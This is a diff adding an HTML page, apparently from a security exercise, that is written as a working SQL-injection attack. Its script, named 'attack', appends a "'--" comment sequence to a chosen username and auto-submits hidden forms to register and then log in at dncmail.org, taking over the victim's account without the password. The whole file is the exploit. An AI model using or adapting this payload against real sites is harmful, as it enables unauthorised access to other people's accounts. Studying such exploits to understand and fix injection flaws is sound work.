@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+</head>
+
+<body>
+
+<section class="username-input">
+	<p>type in the username: </p>
+	<input type="text" name=""><button>Login</button>
+</section>
+
+<script src="jquery-2.0.3.min.js"></script>
+
+<script type="text/javascript">
+var main = function(){
+
+	var attack = function() {
+		var $new_input;
+		var $inject_input;
+		var $email
+
+		if($(".username-input input").val() !== "") {
+			$new_input = $(".username-input input").val();
+			$inject_input = $new_input + "'--";
+			$email = $inject_input + "@naive.com";
+
+			
+			//register first
+			document.getElementsByName("email")[0].value = $email;
+			document.getElementsByName("login")[0].value = $inject_input;
+			document.getElementById("register").submit();
+
+			//inject sql
+			document.getElementsByName("login")[1].value = $inject_input;
+			document.getElementById("hackform").submit();
+		}
+	};
+
+	$(".username-input button").on("click", function(event) {
+		attack();
+	});
+
+};
+
+$(document).ready(main);
+
+
+</script>
+
+<form id="register" action="http://dncmail.org/register.php" method="post">
+	<input type="hidden" name="action" value="register">
+	<input type="hidden" name="email" value="">
+	<input type="hidden" name="login" value="">
+	<input type="hidden" name="pw1" value="attack">
+	<input type="hidden" name="pw2" value="attack">
+</form>
+
+
+
+
+<form id="hackform" action="http://dncmail.org/" method="post">
+	<input type="hidden" name="login" value="">
+	<input type="hidden" name="pw" value="attack">
+	<input type="hidden" name="action" value="login">
+</form>
+
+
+
+</body>
+</html>
